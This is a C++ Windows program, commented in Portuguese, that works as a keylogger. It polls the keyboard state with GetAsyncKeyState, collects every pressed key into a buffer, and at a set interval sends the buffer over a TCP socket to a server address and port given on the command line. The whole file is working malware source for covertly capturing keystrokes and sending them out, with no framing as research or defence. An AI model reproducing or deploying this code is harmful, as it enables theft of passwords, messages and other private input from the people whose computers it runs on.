#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <cstdio>
#include <iostream>
#include <string>
#include <chrono>

using namespace std;

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024

WSADATA wsaData;
SOCKET clientSocket;
sockaddr_in serverAddr;

void send_msg(const char * txt){
    send(clientSocket, txt, strlen(txt), 0);
}

const char * convert(int i){
    // Determina o tamanho necessário para armazenar o inteiro como string
    int tamanhoString = snprintf(NULL, 0, "%c", i);
    // Aloca memória para a string (incluindo espaço para o caractere nulo)
    char* minhaString = (char*)malloc(tamanhoString + 1);
    // Converte o inteiro para string
    snprintf(minhaString, tamanhoString + 1, "%c", i);
    // Agora você pode usar minhaString como const char*
    const char* minhaStringConstChar = minhaString;

    return minhaStringConstChar;
}

int iniciarSocket(const char* address, int port){
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("\nErro ao iniciar winsock\n");
        return 1;
    }
    else {
        printf("\nIniciado winsock\n");
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(address);
    return 0;
}

int iniciarCliente(){
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (clientSocket == INVALID_SOCKET) {
        printf("\nErro ao criar o socket do cliente\n");
        WSACleanup();
        return 1;
    }
    else {
        printf("\nSocket do cliente criado\n");
    }

    return 0;
}

int conectarCliente(){
    if (connect(clientSocket, reinterpret_cast<SOCKADDR*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("\nErro ao conectar com servidor\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }
    else {
        printf("\nConectado ao servidor\n");
        return 0;
    }
}

int fecharSocketClient(){
    closesocket(clientSocket);
    WSACleanup();
    return 0;
}

int main(int argc, char *argv[]){
    // int lenght = sizeof(*argv) / sizeof(char);  

    int result, i;
    int count = 0;

    string text;  

    string address = argv[1];
    int port = stoi(argv[2]);
    int time_resquest = stoi(argv[3]);

    if(iniciarSocket(address.c_str(), port) != 0){
        return 1;
    }
    if(iniciarCliente() != 0){
        return 1;
    }
    if(conectarCliente() != 0){
        return 1;
    }

    auto start = chrono::high_resolution_clock::now();
    auto stop = chrono::high_resolution_clock::now();

    while(true) {
        Sleep(10);
        auto duration = chrono::duration_cast<chrono::milliseconds>(stop - start);
        if(duration.count() >= time_resquest){
            send_msg(text.c_str());
            text = "";
            start = chrono::high_resolution_clock::now();
        }
        for(i = 8; i <= 255; i++) {
            result = GetAsyncKeyState(i);
            if(result == -32767) {
                text += (char)i;
                count += 1;
            }
        }
        stop = chrono::high_resolution_clock::now();
    }   
    
    return 0;
}